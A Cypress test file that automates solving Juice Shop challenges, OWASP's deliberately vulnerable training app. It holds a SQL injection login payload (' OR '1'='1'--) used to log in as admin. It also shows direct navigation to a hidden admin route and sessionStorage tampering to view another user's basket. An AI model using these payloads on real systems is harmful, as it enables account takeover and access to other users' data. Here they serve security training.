import firstVisitPopups from '../POM/FirstVisitPopups.pom';
import headerBar from '../POM/headerBar.pom';
import loginPage from '../POM/loginPage.pom';
import scoreBoard from '../POM/ScoreBoard.pom';

describe('OWASP JuiceShop Achivments unlocking Automation', () => {
  context('2 - stars vulnerabilities', () => {

    before(() => {
      cy.visit('/');
      cy.wait(2000);
      firstVisitPopups.closeFirstVisitMesseges();
    });

    beforeEach(() => {
      Cypress.Cookies.preserveOnce('cookieconsent_status', 'welcomebanner_status', 'language');
      cy.visit('/');
    });

    it('1 - Login Admin', () => {
      loginPage.login("' OR '1'='1'--", " ");
      scoreBoard.checkIsAchivSolvedXHR('Login Admin');
    });

    it('2 - Admin Section', () => {
      //path found in main-es2018.js file
      cy.visit('/administration');
      scoreBoard.checkIsAchivSolvedXHR('Admin Section');
    });

    it.only('3 - View Basket', () => {
      loginPage.login("' OR '1'='1'--", " ");
      headerBar.basketButon().click();
      cy.window()
        .its("sessionStorage").then((storage) => {
          storage.bid = 2;
        });
      cy.reload();
      scoreBoard.checkIsAchivSolvedXHR('View Basket');
    });
  });
});
